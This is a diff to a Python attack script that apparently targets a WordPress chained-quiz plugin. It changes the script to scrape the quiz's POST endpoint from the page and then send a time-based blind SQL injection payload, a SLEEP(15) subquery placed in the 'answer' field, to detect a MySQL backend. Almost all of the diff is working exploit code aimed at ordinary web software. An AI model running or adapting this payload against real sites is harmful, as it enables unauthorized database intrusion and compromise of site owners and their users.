@@ -167,6 +167,11 @@ while exit != "y":
             print ('I am going to inject the function SLEEP(15), that is a mySQL function.')
             print ('This means that if I get the answer after 15 seconds the underlying database is a mySQL database.')
 
+            actiondiv = soupParser.findAll("div", {"class": "chained-quiz-action"})
+            x = re.findall("http.*\.php", str(actiondiv[0]))
+            postrequesturl = x[0]
+
+
             postdata = {
                     "answer" : '1) AND (SELECT 8561 FROM (SELECT(SLEEP(15)))UzqU) AND (1071=1071',
                     "question_id" : 1,
@@ -181,11 +186,9 @@ while exit != "y":
             print ('Payload:')
             print (postdata)
 
-            url = url + 'wp-admin/admin-ajax.php'
-
             print("requesting")
 
-            r = requests.post(url, data=postdata)
+            r = requests.post(postrequesturl, data=postdata)
 
             print ("done")
 
